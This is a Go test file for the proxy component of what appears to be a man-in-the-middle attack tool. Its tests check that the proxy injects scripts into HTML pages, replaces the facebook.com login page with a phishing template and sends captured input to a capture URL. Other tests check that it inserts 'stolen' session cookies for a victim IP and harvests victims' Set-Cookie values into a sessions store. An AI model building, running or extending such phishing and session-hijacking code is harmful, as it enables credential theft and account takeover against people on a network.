package proxy

import (
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/elazarl/goproxy"

	"github.com/qyvora/toha3ee/internal/events"
	"github.com/qyvora/toha3ee/internal/hijack"
	"github.com/qyvora/toha3ee/internal/store"
)

func TestInjectJS(t *testing.T) {
	body := []byte("<html><head></head><body>hi</body></html>")
	out := injectJS(body, []byte("<script>alert(1)</script>"))
	if !strings.Contains(string(out), "<script>alert(1)</script>") {
		t.Fatal("snippet not injected")
	}
	if !strings.Contains(string(out), "</head>") {
		t.Fatal("injection broke the head")
	}
	// Body with no head tag is returned unchanged.
	if got := injectJS([]byte("no head here"), []byte("<script>x</script>")); string(got) != "no head here" {
		t.Fatal("unexpected mutation")
	}
}

func TestContentTypeIsHTML(t *testing.T) {
	r := &http.Response{Header: http.Header{}}
	r.Header.Set("Content-Type", "text/html; charset=utf-8")
	if !contentTypeIsHTML(r) {
		t.Fatal("text/html not detected")
	}
	r.Header.Set("Content-Type", "application/json")
	if contentTypeIsHTML(r) {
		t.Fatal("json wrongly detected as html")
	}
}

func TestFormSwapServesTemplate(t *testing.T) {
	db := store.New(100)
	cfg := Config{
		DB:              db,
		Bus:             events.NewBus(),
		Injector:        hijack.NewInjector(),
		PhishDomains:    map[string]string{"facebook.com": "facebook"},
		PhishCaptureURL: "http://127.0.0.1:8081",
	}
	p := New(cfg)

	// Backend "real" site.
	backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		io.WriteString(w, "<html><head></head><body>real facebook login</body></html>")
	}))
	defer backend.Close()

	// Point the proxy at the backend: configure it as an ordinary handler via
	// goproxy with a fixed upstream. goproxy resolves the URL host over DNS,
	// so route via the proxy's HTTP client instead: we call onResponse/onRequest
	// manually to avoid a full network test.
	req, _ := http.NewRequest("GET", "http://facebook.com/login", nil)
	req.RemoteAddr = "192.168.8.50:12345"
	proxyCtx := &goproxy.ProxyCtx{Req: req}

	p.onRequest(req, proxyCtx)
	resp := &http.Response{
		Status:        "200 OK",
		StatusCode:    200,
		Header:        http.Header{},
		Body:          io.NopCloser(strings.NewReader("<html><head></head><body>real</body></html>")),
		ContentLength: 34,
	}
	resp.Header.Set("Content-Type", "text/html")
	resp = p.onResponse(resp, proxyCtx)
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if !strings.Contains(string(body), "Facebook") || strings.Contains(string(body), "real facebook") {
		t.Fatalf("form swap failed: %s", body)
	}
	if req.Header.Get("X-Test") != "" {
		t.Fatal("unexpected header")
	}
}

func TestCookieHarvestAndInjector(t *testing.T) {
	db := store.New(100)
	inj := hijack.NewInjector()
	inj.Add(hijack.CookieInjection{
		VictimIP: "192.168.8.50",
		Host:     "facebook.com",
		Cookies:  map[string]string{"session": "stolen"},
	})
	cfg := Config{DB: db, Bus: events.NewBus(), Injector: inj}
	p := New(cfg)

	req, _ := http.NewRequest("GET", "http://facebook.com/home", nil)
	req.RemoteAddr = "192.168.8.50:12345"
	p.onRequest(req, &goproxy.ProxyCtx{Req: req})
	if got := req.Header.Get("Cookie"); !strings.Contains(got, "session=stolen") {
		t.Fatalf("injection not applied: %q", got)
	}

	// Response sets a cookie -> session captured.
	resp := &http.Response{
		StatusCode: 200,
		Header:     http.Header{},
		Body:       io.NopCloser(strings.NewReader("x")),
	}
	resp.Header.Add("Set-Cookie", "sid=abc123; Path=/")
	resp = p.onResponse(resp, &goproxy.ProxyCtx{Req: req})
	resp.Body.Close()
	sess := db.Sessions()
	if len(sess) != 1 || sess[0].VictimIP != "192.168.8.50" || sess[0].Cookies["sid"] != "abc123" {
		t.Fatalf("session not captured: %+v", sess)
	}
}
